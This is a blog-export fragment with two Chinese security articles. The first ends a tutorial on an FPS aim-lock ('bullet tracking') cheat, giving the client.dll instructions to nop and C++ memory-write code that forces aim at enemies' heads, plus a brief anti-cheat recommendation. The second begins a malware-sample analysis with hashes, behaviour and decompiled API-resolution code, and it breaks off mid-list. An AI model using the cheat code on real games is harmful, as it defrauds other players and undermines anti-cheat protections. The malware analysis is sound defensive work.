src=\"/../images/GameHacker/%E6%B5%85%E8%B0%88FPS%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/image-20221019162645779.png\" alt=\"image-20221019162645779\"></p>\n<p>我们再来看第二条语句的</p>\n<p><img src=\"/../images/GameHacker/%E6%B5%85%E8%B0%88FPS%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/image-20221019162648454.png\" alt=\"image-20221019162648454\"></p>\n<p>这两段代码几乎相同，都是把视角坐标取出来后赋值给另一个地址。经过我们上面分析，瞄准和射击分为两个部分，他们都是需要去访问读取视角坐标的，巧的是这里对视角坐标访问恰好就是有两个，那么我们可以怀疑一下这两个语句分别就是对应瞄准和射击。我们直接nop看效果，先nop第一个</p>\n<p><img src=\"/../images/GameHacker/%E6%B5%85%E8%B0%88FPS%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/image-20221019162650987.png\" alt=\"image-20221019162650987\"></p>\n<p>因为eax和eax+4分别存储视角Y和X，所以得nop两条语句。接下来我们进入游戏看看</p>\n<p><img src=\"/../images/GameHacker/%E6%B5%85%E8%B0%88FPS%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/image-20221019162653368.png\" alt=\"image-20221019162653368\"></p>\n<p>我们发现nop之后虽然我们没法改变视角，但是我们会发现，鼠标XY竟然在改变，然后我们开枪，发现子弹依旧是打在墙上，这就尴尬了。。。。。我们添加一个机器人，我们走到他的面前，我们把准星对准他的头部，然后重新nop该处代码。</p>\n<p><img src=\"/../images/GameHacker/%E6%B5%85%E8%B0%88FPS%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/image-20221019162656248.png\" alt=\"image-20221019162656248\"></p>\n<p>神奇的一幕来，无论我们朝他头部开多少枪，就是打不了。为什么？我们还原代码</p>\n<p><img src=\"/../images/GameHacker/%E6%B5%85%E8%B0%88FPS%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/image-20221019162659031.png\" alt=\"image-20221019162659031\"></p>\n<p>发现我们准星此时指的是这个位置，此时我们把视角瞄准敌人后再次nop</p>\n<p><img src=\"/../images/GameHacker/%E6%B5%85%E8%B0%88FPS%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/image-20221019162701960.png\" alt=\"image-20221019162701960\"></p>\n<p>就变成了这样，我们用手枪打一下。</p>\n<p><img src=\"/../images/GameHacker/%E6%B5%85%E8%B0%88FPS%E5%AD%90%E5%BC%B9%E8%BF%BD%E8%B8%AA%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/image-20221019162704978.png\" alt=\"image-20221019162704978\"></p>\n<p>发现敌人被我们爆头了。我们就能百分百确认了，该代码段为控制视角，真实控制射击的是第二条访问语句或者直接是鼠标XY。现在呢，已经可以写代码了，不过这里我只提供关键代码，其余代码大家可以自己完善。</p>\n<h1 id=\"代码：\"><a href=\"#代码：\" class=\"headerlink\" title=\"代码：\"></a><strong>代码：</strong></h1><p>在研究的时候我们发现一旦nop之后，视角直接发生改变，而且直接把人物指向0的位置，是因为我们nop后视角坐标得不到赋值，就一直为0。那我们我们想让我们视角保持不变怎么办？那就得需要一个变量来记录。当我们开枪的时候，先把当前的视角坐标记录，然后把这个记录的值写入视角坐标，这样就达到一个锁视角的效果，然后再通过自瞄算法把自瞄角度算出来再写入鼠标XY中，最后实现追踪效果，追踪完毕后再恢复代码。那么如何确定视角坐标地址呢？</p>\n<p>首先我们已经找到控制视角的代码段了，不难发现，控制视角的关键语句为的两条</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">client.dll+CB0D0 - 8B 44 24 04           - mov eax,[esp+04]</span><br><span class=\"line\">client.dll+CB0D4 - 8B 10               - mov edx,[eax]</span><br><span class=\"line\">client.dll+CB0D6 - 89 91 040F0000            - mov [ecx+00000F04],edx           ---------&gt;视角Y</span><br><span class=\"line\">client.dll+CB0DC - 8B 50 04             - mov edx,[eax+04]</span><br><span class=\"line\">client.dll+CB0DF - 89 91 080F0000            - mov [ecx+00000F08],edx           ---------&gt;视角X</span><br><span class=\"line\">client.dll+CB0E5 - 8B 40 08             - mov eax,[eax+08]</span><br><span class=\"line\">client.dll+CB0E8 - 89 81 0C0F0000            - mov [ecx+00000F0C],eax</span><br><span class=\"line\">client.dll+CB0EE - C2 0400              - ret 0004ret 0004</span><br></pre></td></tr></table></figure>\n\n<p>那么我们可以直接采用hook技术，把记录的值写入这两地址里即可。以下为部分代码</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">    <span class=\"comment\">//静默自瞄</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (g_bBulletTrack)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"built_in\">GetAsyncKeyState</span>(VK_LBUTTON) != <span class=\"number\">0</span> &amp;&amp; dwTargetObj != <span class=\"number\">0</span>)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (Data::<span class=\"built_in\">getHp</span>(dwTargetObj) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        bAimLock = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                        AimAngle = Data::<span class=\"built_in\">getAimAngle</span>(Data::<span class=\"built_in\">getBonePos</span>(LocalPlayer.obj, Bone_Head), Data::<span class=\"built_in\">getBonePos</span>(dwTargetObj, Bone_Head));</span><br><span class=\"line\">                        AimPunch = Data::<span class=\"built_in\">getAimPunch</span>(LocalPlayer.obj);</span><br><span class=\"line\">                        AimAngle.x -= AimPunch.x;</span><br><span class=\"line\">                        AimAngle.y -= AimPunch.y;</span><br><span class=\"line\">                        BulletTrack::<span class=\"built_in\">Track</span>(<span class=\"literal\">true</span>, AimAngle);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">else</span></span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    BulletTrack::<span class=\"built_in\">Track</span>(<span class=\"literal\">false</span>, AimAngle);</span><br><span class=\"line\">                    bAimLock = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                    fValue1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*追踪实现*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Track</span><span class=\"params\">(<span class=\"type\">bool</span> state,Vector2 angle)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (state == <span class=\"literal\">true</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            g_dwTrackSwitch = <span class=\"number\">1</span>; <span class=\"comment\">//开</span></span><br><span class=\"line\">            g_AimAngle = angle;</span><br><span class=\"line\">            <span class=\"built_in\">lockScreenView</span>(); <span class=\"comment\">//锁定视角</span></span><br><span class=\"line\">            <span class=\"built_in\">WriteMem</span>&lt;FLOAT&gt;(<span class=\"built_in\">ReadMem</span>&lt;DWORD&gt;(g_dwEngineModule + m_Mouse) + m_offsetMouseY , g_saveMouse.y);  <span class=\"comment\">//写自瞄角度</span></span><br><span class=\"line\">            <span class=\"built_in\">WriteMem</span>&lt;FLOAT&gt;(<span class=\"built_in\">ReadMem</span>&lt;DWORD&gt;(g_dwEngineModule + m_Mouse) + m_offsetMouseY+<span class=\"number\">4</span>, g_saveMouse.x);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (g_dwTrackSwitch == <span class=\"number\">1</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                g_dwTrackSwitch = <span class=\"number\">0</span>; <span class=\"comment\">//关</span></span><br><span class=\"line\">                <span class=\"built_in\">resumeScreenView</span>(); <span class=\"comment\">//恢复视角</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"防护：\"><a href=\"#防护：\" class=\"headerlink\" title=\"防护：\"></a><strong>防护：</strong></h1><p>正如我在文中多次提到，该种追踪的实现方法在很多款游戏我已经实现了，页游到端游的部分游戏都会存在，并且没有一丝丝的检测。游戏厂商应该对此重视一下，稍微对其关键部位进行检测，并对鼠标XY的数据进行校验，以防不法分子对其进行篡改。</p>\n<h1 id=\"补充：\"><a href=\"#补充：\" class=\"headerlink\" title=\"补充：\"></a><strong>补充：</strong></h1><p>本文提到的 <strong>准星、视角、鼠标</strong> 均为一个东西。</p>\n<h1 id=\"回复\"><a href=\"#回复\" class=\"headerlink\" title=\"回复\"></a><strong>回复</strong></h1><p>既然大家都这么热情，我就简单说说把。对于提到的这个追踪只能给自己看，敌人视角还是能看到锁住的这个问题我确实没去注意到，这里算是我的一个失误。但是抛开这些小问题，你们都觉得这个不是子弹追踪。那行，就再聊聊。</p>\n<p>子弹追踪目前市场上热门的分三种，魔术子弹、弹道追踪、视角追踪。大致是这三种，其他的肯定还是有，这里我就不阐述。不过这三种的区别我简单讲一下。</p>\n<p>魔术子弹：直接在子弹产生的那个时候把子弹坐标改成敌人坐标，直接把敌人击杀。pubg的穿山爆车，隔着各种障碍物秒人就是这个，很多人以为是子弹穿墙，其实不是。</p>\n<p>弹道追踪：这个虽然是和魔术子弹都是从子弹下手，但是他不同于魔术子弹，这个他不能无视障碍物，效果就是和视角追踪一样，只不过他这个是对子弹做了处理。</p>\n<p>视角追踪：就是我文章提到的。我就不说了，你们如果混黑产就去看看某平，某战场的源代码，看看是不是这个东西。</p>\n<p>其实我文章开头已经提到两个内容了，一个是我只讲一种的实现原理，另一个就是不希望大家被子弹追踪这个名字给约束。功能是叫这个名字，但是实现是另外一回事，你能实现这个功能的效果，那总的来说也能称之为子弹追踪，只不过可能不太准确。就好比你实现透视方法很多种，雷达，方框，Z轴等等，更牛逼还是直接画在h5，可最终的目的还是看到敌人玩家。功能的名字是固定的，但是思维碰撞是不定的，你研究一样东西你不能总在抠字眼，老人都常说，不管黑猫白猫，能抓到老鼠都是好猫。如果非要否定，那也没办法。我写出来是为了技术分享，别无他意。</p>\n","categories":["GameHacker"]},{"title":"记一次头铁的病毒样本分析过程","url":"/2024/04/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/","content":"<h1 id=\"记一次头铁的病毒样本分析过程\"><a href=\"#记一次头铁的病毒样本分析过程\" class=\"headerlink\" title=\"记一次头铁的病毒样本分析过程\"></a>记一次头铁的病毒样本分析过程</h1><ul>\n<li><a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2021-10-27 05:07</li>\n</ul>\n<h1 id=\"一、样本：\"><a href=\"#一、样本：\" class=\"headerlink\" title=\"一、样本：\"></a>一、样本：</h1><p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<h2 id=\"1-运行效果：\"><a href=\"#1-运行效果：\" class=\"headerlink\" title=\"[1]运行效果：\"></a>[1]运行效果：</h2><p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>点击确定后就无任何反应。</p>\n<h1 id=\"二、静态分析\"><a href=\"#二、静态分析\" class=\"headerlink\" title=\"二、静态分析\"></a>二、静态分析</h1><h2 id=\"1-程序信息\"><a href=\"#1-程序信息\" class=\"headerlink\" title=\"[1]程序信息\"></a>[1]程序信息</h2><blockquote>\n<p>MD5    fdd9fd0249d48d8c6d991741c67fcfeb<br>SHA-1    ff0181242825b5bb8cac1d4d17e8377352e3aa55<br>SHA-256    6a9bdabc4599618513de5c963972929de9322c486e84e101e177c0868e7c5fb7<br>File size    1.34 MB (1408512 bytes)</p>\n</blockquote>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>其中较为引人注目的就是winnet.dll、shell32.dll、advapi32.dll，这三者分别是对网络，运行程序，注册表进行操作的动态库，说明程序存在运行外部程序和联网操作。</p>\n<p>字符串的话，通过Strings.exe查询后没发现任何敏感字符串，这里就不贴出来了。（因为太多了 &#x3D;。&#x3D;）</p>\n<h2 id=\"2-在线查毒\"><a href=\"#2-在线查毒\" class=\"headerlink\" title=\"[2]在线查毒\"></a>[2]在线查毒</h2><p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<h2 id=\"3-进程行为监控：\"><a href=\"#3-进程行为监控：\" class=\"headerlink\" title=\"[3]进程行为监控：\"></a>[3]进程行为监控：</h2><p>通过火绒的监控发现其对注册表进行了大量操作，不过并没什么影响。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>且运行了一个名为CrashReporter.exe的程序。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>途中创建了一些文件</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>首先是CrashReporter.exe,跳到目标目录后发现其文件大小与样本大小相同，故猜测此样本运行后将自身转移到新路径后伪装绿色运行，其次是txt，打开后发现内容为</p>\n<blockquote>\n<p>ABC<br>AAC<br>AAD<br>BBC<br>BAC<br>BAD</p>\n</blockquote>\n<p>暂时不知什么意思，然后是WeiXinCR01,内容为</p>\n<blockquote>\n<p>D2 C2 7E AD 52 06 C4 93</p>\n</blockquote>\n<p>这里根据后面的调试，发现内容含义为Crc32计算C盘的序列号的结果。</p>\n<h2 id=\"4-网络行为\"><a href=\"#4-网络行为\" class=\"headerlink\" title=\"[4]网络行为\"></a>[4]网络行为</h2><p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p>HttpDebuger无任何发现。</p>\n<h1 id=\"三、动静态分析\"><a href=\"#三、动静态分析\" class=\"headerlink\" title=\"三、动静态分析\"></a>三、动静态分析</h1><p>首先分析原样本，突破口可以从给MessageBoxA下断后返回拿到关键点。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p>这里直接返回到call的位置，直接计算call地址的相对地址，然后扔进IDA进行分析。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p>这个样本在静态分析时之所以没有看到敏感字符串是因为他的字符串都是以字符数组初始化的，</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p>在分析的时候可以通过先转义这些字符数组的内容，再去分析这个地方执行了什么。比如这里的字符数组为SetEvent error，那么说明调用SetEvent失败。并且他这个样本调用函数的方式是通过一个类似shellcode的方法获取，然后把函数存放放到一个全局变量里。</p>\n<p>我们来到调用了MessageBoxA后，直接到函数头部进行一直交叉引用，最后来到了WinMain的最初调用处。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<p>这个过程中会发现整个代码中存在很多这种形式的代码。</p>\n<p><img src=\"/../images/Virus/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B4%E9%93%81%E7%9A%84%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p>这些代码看似是在获取TEB和PEB操作，但是经过简单分析后，发现这些其实就是垃圾代码，只是为了通过增大代码量，用来增加分析时间。</p>\n<h2 id=\"1-StartMainWork分析\"><a href=\"#1-StartMainWork分析\" class=\"headerlink\" title=\"[1]StartMainWork分析\"></a>[1]StartMainWork分析</h2><p>在这个StartMainWork函数执行前，会执行几个数据初始化的函数,包括有crc32和crc64表的生成，动态库函数的获取，还有样本之后所需要用到的数据。这里crc32和64生成的函数很好识别，因为其算法固定，且带有常量值，下面是样本生成crc的关键代码。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">256</span>; ++i ) <span class=\"comment\">// 开始生成crc32表</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">crcValue = i;</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">8</span>; ++j )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">......垃圾代码........</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( crcValue &amp; <span class=\"number\">1</span> )</span><br><span class=\"line\">crcValue = (crcValue &gt;&gt; <span class=\"number\">1</span>) ^ <span class=\"number\">0xEDB88320</span>;<span class=\"comment\">// 搜索这个值，可以知道这里是CRC算法的常量值</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">crcValue = crcValue &gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">g_crc32Table[i] = crcValue;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( jj = <span class=\"number\">0</span>; jj &lt; <span class=\"number\">256</span>; ++jj ) <span class=\"comment\">// 开始生成crc64表</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">v45 = jj;</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( kk = <span class=\"number\">0</span>; kk &lt; <span class=\"number\">8</span>; ++kk )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">......垃圾代码........</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v45 &amp; <span class=\"number\">1</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">LODWORD(v0) = (v45 &gt;&gt; <span class=\"number\">1</span>) ^ <span class=\"number\">0xAC4BC9B5</span>; <span class=\"comment\">// 根据这个常量值，搜索后发现是crc64的常量值</span></span><br><span class=\"line\">HIDWORD(v0) = (v45 &gt;&gt; <span class=\"number\">1</span> &gt;&gt; <span class=\"number\">32</span>) ^ <span class=\"number\">0x95AC9329</span>;</span><br><span class=\"line\">v45 = v0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">v45 &gt;&gt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">g_crc64Table_Low[<span class=\"number\">2</span> * jj] = v45;</span><br><span class=\"line\">g_crc64Table_Hight[<span class=\"number\">2</span> * jj] = HIDWORD(v45);</span><br></pre></td></tr></table></figure>\n\n<p>然后比较有意思的就是动态库函数的获取了，该样本采取了类似shellcode的方式获取，通过Ldr来遍历自身的dll模块，然后通过都PE文件的解析寻找函数地址，并添加到全局函数表中。该方式在《恶意代码分析实战》一书中第十九章的shellcode符号解析有讲解，这里就不详细解释了。以下是关键代码。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">peb = readPEB();</span><br><span class=\"line\">*functionTable = peb;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( peb )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"comment\">// 通过动态调试得知这里获取的是Kernel32.dll地址,参数二为字符串Kernel32.dll通过crc32计算后的结果</span></span><br><span class=\"line\">ModuleBase = getModuleBaseByCrcValue(*functionTable, <span class=\"number\">0xF7784A01</span>);</span><br><span class=\"line\">functionTable[<span class=\"number\">1</span>] = ModuleBase;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( KernelBase )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"comment\">// 直接从目录项里获取参数三对应的函数地址</span></span><br><span class=\"line\">procCreateFileA = getProcAddrByDirArray(functionTable[<span class=\"number\">1</span>], <span class=\"number\">-1</span>, (<span class=\"type\">int</span>)&amp;strCreateFileA, <span class=\"number\">0</span>);</span><br><span class=\"line\">....往下的也是一样</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">............</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里贴出他加载的所有函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ==&gt;     <span class=\"number\">757E3090</span>  kernel32.CreateFileA</span><br><span class=\"line\">$+<span class=\"number\">4</span>       <span class=\"number\">757</span>DDF70  kernel32.GetLastError</span><br><span class=\"line\">$+<span class=\"number\">8</span>       <span class=\"number\">757</span>D83E0  kernel32.GetSystemDirectoryA</span><br><span class=\"line\">$+C       <span class=\"number\">757E22</span>D0  kernel32.ExpandEnvironmentStringsA</span><br><span class=\"line\">$+<span class=\"number\">10</span>      <span class=\"number\">757E0</span>BE0  kernel32.GetStartupInfoA</span><br><span class=\"line\">$+<span class=\"number\">14</span>      <span class=\"number\">757F</span>2DA0  kernel32.CreateProcessA</span><br><span class=\"line\">$+<span class=\"number\">18</span>      <span class=\"number\">757E2</span>E40  kernel32.CloseHandle</span><br><span class=\"line\">$+<span class=\"number\">1</span>C      <span class=\"number\">757E3030</span>  kernel32.WaitForSingleObject</span><br><span class=\"line\">$+<span class=\"number\">20</span>      <span class=\"number\">757E3420</span>  kernel32.ReadFile</span><br><span class=\"line\">$+<span class=\"number\">24</span>      <span class=\"number\">757</span>D89C0  kernel32.lstrcat</span><br><span class=\"line\">$+<span class=\"number\">28</span>      <span class=\"number\">757E2</span>DF0  kernel32.GetCurrentProcessId</span><br><span class=\"line\">$+<span class=\"number\">2</span>C      <span class=\"number\">757</span>DDE70  kernel32.GetCurrentThreadId</span><br><span class=\"line\">$+<span class=\"number\">30</span>      <span class=\"number\">757E2300</span>  kernel32.GetTickCount</span><br><span class=\"line\">$+<span class=\"number\">34</span>      <span class=\"number\">757E3510</span>  kernel32.WriteFile</span><br><span class=\"line\">$+<span class=\"number\">38</span>      <span class=\"number\">757F</span>2D80  kernel32.CreatePipe</span><br><span class=\"line\">$+<span class=\"number\">3</span>C      <span class=\"number\">75130000</span>  <span class=\"string\">&quot;MZ?&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">40</span>      <span class=\"number\">75155840</span>  user32.wsprintfA</span><br><span class=\"line\">$+<span class=\"number\">44</span>      <span class=\"number\">757</span>C0000  <span class=\"string\">&quot;MZ?&quot;</span></span><br><span class=\"line\">$+<span class=\"number\">48</span>      <span class=\"number\">757E0</span>B30  kernel32.LoadLibraryA</span><br><span class=\"line\">$+<span class=\"number\">4</span>C      <span class=\"number\">757E0</span>A40  kernel32.FreeLibrary</span><br><span class=\"line\">$+<span class=\"number\">50</span>      <span class=\"number\">757E0</span>D90  kernel32.GetModuleFileNameA</span><br><span class=\"line\">$+<span class=\"number\">54</span>      <span class=\"number\">757</span>DE010  kernel32.lstrlenW</span><br><span class=\"line\">$+<span class=\"number\">58</span>      <span class=\"number\">757</span>DDF00  kernel32.SetLastError</span><br><span class=\"line\">$+<span class=\"number\">5</span>C      <span class=\"number\">7581F</span>6A0  kernel32.lstrcpyW</span><br><span class=\"line\">$+<span class=\"number\">60</span>      <span class=\"number\">757E03</span>A0  kernel32.lstrlenA</span><br><span class=\"line\">$+<span class=\"number\">64</span>      <span class=\"number\">757</span>D8320  kernel32.lstrcpyA</span><br><span class=\"line\">$+<span class=\"number\">68</span>      <span class=\"number\">757</span>DF440  kernel32.lstrcmp</span><br><span class=\"line\">$+<span class=\"number\">6</span>C      <span class=\"number\">757</span>DF320  kernel32.VirtualAlloc</span><br><span class=\"line\">$+<span class=\"number\">70</span>      <span class=\"number\">757</span>DF420  kernel32.VirtualFree</span><br><span class=\"line\">$+<span class=\"number\">74</span>      <span class=\"number\">757E0860</span>  kernel32.GetModuleFileNameW</span><br><span class=\"line\">$+<span class=\"number\">78</span>      <span class=\"number\">757E3090</span>  kernel32.CreateFileA</span><br><span class=\"line\">$+<span class=\"number\">7</span>C      <span class=\"number\">757E32</span>C0  kernel32.GetFileSize</span><br><span class=\"line\">$+<span class=\"number\">80</span>      <span class=\"number\">757E3420</span>  kernel32.ReadFile</span><br><span class=\"line\">$+<span class=\"number\">84</span>      <span class=\"number\">757E2</span>E40  kernel32.CloseHandle</span><br><span class=\"line\">$+<span class=\"number\">88</span>      <span class=\"number\">757</span>D88F0  kernel32.GetEnvironmentVariableA</span><br><span class=\"line\">$+<span class=\"number\">8</span>C      <span class=\"number\">757</span>D89C0  kernel32.lstrcat</span><br><span class=\"line\">$+<span class=\"number\">90</span>      <span class=\"number\">757E3510</span>  kernel32.WriteFile</span><br><span class=\"line\">$+<span class=\"number\">94</span>      <span class=\"number\">757</span>DDF70  kernel32.GetLastError</span><br><span class=\"line\">$+<span class=\"number\">98</span>      <span class=\"number\">757E0</span>E60  kernel32.Sleep</span><br><span class=\"line\">$+<span class=\"number\">9</span>C      <span class=\"number\">757E3030</span>  kernel32.WaitForSingleObject</span><br><span class=\"line\">$+A0      <span 